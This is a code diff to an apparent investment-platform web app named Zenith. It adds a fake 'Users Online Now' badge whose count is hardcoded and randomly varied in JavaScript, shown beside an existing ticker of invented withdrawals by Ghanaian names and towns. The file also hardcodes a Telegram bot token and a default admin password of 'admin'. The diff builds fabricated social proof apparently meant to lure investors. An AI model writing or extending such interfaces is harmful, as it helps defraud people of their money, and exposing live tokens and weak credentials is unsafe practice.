@@ -31,6 +31,9 @@ if not os.path.exists(UPLOAD_FOLDER):
 # Default admin credentials
 ADMIN_PASSWORD = "admin"
 
+# --- CONFIGURABLE ONLINE USERS MOCKING ---
+ONLINE_USERS_BASE = 1068
+
 # --- TELEGRAM CONFIGURATION ---
 TELEGRAM_BOT_TOKEN = "8986122115:AAEDwqKHTTUgtXiR6lEmIRsZleN1XTxWLWw"
 TELEGRAM_CHAT_ID = "8393567505"
@@ -438,6 +441,9 @@ INVESTOR_DASHBOARD_TEMPLATE = """
         .flash { background: #ffebee; color: #c62828; padding: 10px; margin-bottom: 15px; border-radius: 4px; text-align: center; }
         .side-ticker-item { background: #1e293b; border-left: 3px solid #00ff66; padding: 10px; margin-bottom: 10px; border-radius: 4px; font-size: 12px; }
         .side-ticker-item b { color: #facc15; }
+        .online-counter-badge { background: #0f172a; border: 1px solid #334155; color: #38bdf8; font-size: 12px; padding: 8px 10px; border-radius: 6px; margin-bottom: 15px; display: flex; align-items: center; gap: 8px; font-weight: bold; }
+        .online-dot { width: 8px; height: 8px; background: #22c55e; border-radius: 50%; box-shadow: 0 0 8px #22c55e; animation: pulseDot 1.5s infinite; }
+        @keyframes pulseDot { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
     </style>
 </head>
 <body>
@@ -507,6 +513,10 @@ INVESTOR_DASHBOARD_TEMPLATE = """
 
         <div class="sidebar-ticker">
             <h3 style="color: #00ff66; font-size: 15px; margin-top: 0; border-bottom: 1px solid #333; padding-bottom: 8px;">🟢 Live Zenith Withdrawals</h3>
+            <div class="online-counter-badge">
+                <div class="online-dot"></div>
+                <span><span id="onlineCountNum">1,068</span> Users Online Now</span>
+            </div>
             <div id="sideTickerList"></div>
         </div>
     </div>
@@ -528,6 +538,19 @@ INVESTOR_DASHBOARD_TEMPLATE = """
         }
         setInterval(updateTimers, 1000);
         updateTimers();
+
+        // Regulated online users simulator
+        let currentOnline = {{ online_users_base }};
+        function fluctuateOnlineUsers() {
+            const fluctuation = Math.floor(Math.random() * 9) - 4; // fluctuates between -4 and +4
+            currentOnline += fluctuation;
+            if (currentOnline < 850) currentOnline = 880;
+            const el = document.getElementById('onlineCountNum');
+            if (el) {
+                el.innerText = currentOnline.toLocaleString();
+            }
+        }
+        setInterval(fluctuateOnlineUsers, 4000);
 
         const sideNames = ["Kwame Mensah", "Abena Osei", "Kofi Boateng", "Afia Serwaa", "Yaw Ansah", "Akosua Frimpong", "Esi Dapaah", "Kojo Addo", "Ama Serwaa", "Nii Armah"];
         const sideTowns = ["Accra", "Kumasi", "Takoradi", "Tamale", "Cape Coast", "Sunyani", "Ho", "Tema"];
@@ -910,6 +933,7 @@ def dashboard():
       investors=investors_found,
       investor_name=investor_name,
       admin_telegram_link=ADMIN_TELEGRAM_LINK,
+      online_users_base=ONLINE_USERS_BASE,
   )
 
 
